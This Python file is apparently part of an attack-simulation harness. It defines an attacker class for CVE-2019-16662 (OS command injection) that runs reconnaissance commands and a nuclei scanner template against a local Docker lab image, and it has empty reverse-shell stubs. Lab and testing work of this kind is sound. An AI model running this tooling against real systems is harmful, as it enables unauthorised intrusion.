from attackerBase import *
from attackConfig import *



class OSCI_CVE_2019_16662_Attacker1(AttackerBase):
    
    def __init__(self):
        self.commandRunner = CommandRunner()
        

        
    def discovery(self) -> None:     
        self.commandRunner.runCommand("pwd | cd")
        self.commandRunner.runCommand("du -sh")
        self.commandRunner.runCommand('id')

    def main(self):
        print("Main method started")
        #self.commandRunner.runCommand('echo "nuclei script started" ')     
        self.commandRunner.runCommand('nuclei -u https://localhost:10000 -t ~/Desktop/TEST_ATTACTKS/ATTACK_YAMLS/CWE-78_OS-Command-Injection/CVE-2019-16662.yaml -debug ')


    # Reverse shell will be handle later...
    def reverseShell(self):

        # init newTerminalThread
        # newTerminalThread -> Open terminal and run specific code ( it will wait) 


        # mainThread
        # Run another command1
        # Run another command2
        # Run another command3
        


        
        pass
    def reverseShell2(self):
        pass

#
def attackInvoker(attackerBase: AttackerBase):
    print("Invoked attack " + attackerBase.__class__.__name__)
    attackerBase.templateMethod()

if __name__ == '__main__':
    
    # Call your custom attacks here
    attackInvoker(OSCI_CVE_2019_16662_Attacker1())




# CWE-78
# CVE-2019-16662
# IP
# PORT
# IMAGE: fab1ano/cve-2019-16662:latest
# sudo docker run -it -p 8080:8080 -d fab1ano/cve-2019-16662:latest

# MAIN YAML PATH: ~/TEST_ATTACTKS/ATTACK_YAMLS/CWE-78_OS-Command-Injection/CVE-2019-16662.yaml
# MAIN YAML AUTHOR: ALI
# MAIN YAML SOURCE: https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2019/CVE-2019-16662.yaml

